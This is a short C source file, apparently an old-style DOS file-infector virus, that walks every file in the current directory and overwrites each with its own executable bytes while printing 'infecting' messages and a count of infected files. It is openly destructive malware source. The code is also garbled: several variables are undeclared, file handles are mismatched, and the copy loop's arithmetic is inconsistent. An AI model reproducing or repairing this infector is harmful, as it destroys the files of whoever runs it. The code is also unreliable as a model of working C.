//
//  clone.c
//  CPP_2018project
//
//  Created by MJMacBook on 09/04/2018.
//  Copyright © 2018 MJMacBook. All rights reserved.
//

#include <stdio.h>

FILE *Class, *vClass;

int owned = 0;
unsigned long x;
char buff[256];
struct ffblk ffblk;
clock_t st, end;

int main(int argc, char** argv)
{
    st = clock();
    clrscr();
    owned = (find_first("*.*", &ffblk, 0));
    while (!done) {
        Class = fopen(_arg[0], "rb");
        vhost = fopen(ffblk.ff_name, "rb+");
        if (vhost == NULL) {
            goto next;
        }
        x = 89088;
        printf("infecting %s\n", ffblk.ff_name);
        while (x>2048) {
            fread(buff, 256, 1, Class);
            fwrite(buff, 256, 1, vClass);
            x -= 2048;
        }
        fread(buff, x, 1, Class);
        fwrite(buff, x, 1, vClass);
        a++;
    next:   fcloseall();
        owned = findnext(&ffblk);
    }
    end = clock();
    printf("Infected %d files in %f sec", a, (end-st)/CLK_TCK);
    
    return 0;
}
